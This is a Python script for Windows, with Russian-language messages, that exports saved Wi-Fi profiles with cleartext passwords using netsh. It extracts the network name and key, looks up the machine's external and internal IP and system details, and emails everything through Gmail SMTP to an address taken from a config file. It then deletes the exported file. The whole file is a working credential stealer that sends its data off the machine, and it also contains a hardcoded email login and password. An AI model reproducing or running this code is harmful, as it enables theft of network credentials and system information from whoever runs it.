import smtplib
import os
import requests
import socket
import config
import subprocess as sp
import platform as pf
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from time import sleep
from xml.dom import minidom

if len(config.wifi) > 0 and len(config.email) > 0:
    sp.call('netsh wlan show profile', shell=True)
    sp.call(f'netsh wlan export profile folder={os.getcwd()}\\ key =clear', shell=True)

    sleep(1)

    def wifi():
        doc = minidom.parse(f'{os.getcwd()}\\Беспроводная сеть-{config.wifi}.xml')
        wifi_name = doc.getElementsByTagName('name')
        wifi_password = doc.getElementsByTagName('keyMaterial')
        data = f'Wi-Fi name: {wifi_name[0].firstChild.data} \nWi-Fi password: {wifi_password[0].firstChild.data}'
        return data

    def get_ip():
        ip = requests.get('http://myip.dnsomatic.com')
        get_ip = ip.text
        data_ip =  f"Внешний IP: {get_ip}"
        return data_ip

    def info_pc():
        system_name = pf.system() + ' ' + pf.release()
        network_name = pf.node()
        ip_pc = socket.gethostbyname(socket.gethostname())
        all_info_pc = f"Сетевое имя ПК: {network_name}\nСистема: {system_name}\nВнутренний IP: {ip_pc}\n"
        return all_info_pc
    
    def all_info():
        info_user = f'{wifi()}\n{get_ip()}\n{info_pc()}'
        return info_user
    
    def send_mail():
        msg = MIMEMultipart()
        msg['Subject'] = 'Wi-Fi Data'
        msg['From'] = 'skuybedin.nik@gmail.com'
        body = all_info()
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login('skuybedin.nik@gmail.com', 'testforprogramm123')
        server.sendmail('skuybedin.nik@gmail.com', config.email, msg.as_string())
        server.quit()
        print(f'Данные успешно отправлены на почту {config.email}')
        os.remove(f'{os.getcwd()}\\Беспроводная сеть-{config.wifi}.xml')
        sleep(2)
    
    def main():
        wifi()
        get_ip()
        info_pc()
        all_info()
        send_mail()

    if __name__ == '__main__':
        main()

else:
    print('Сначала введите название сети и почту для отправки результата в файле config')
    sleep(10)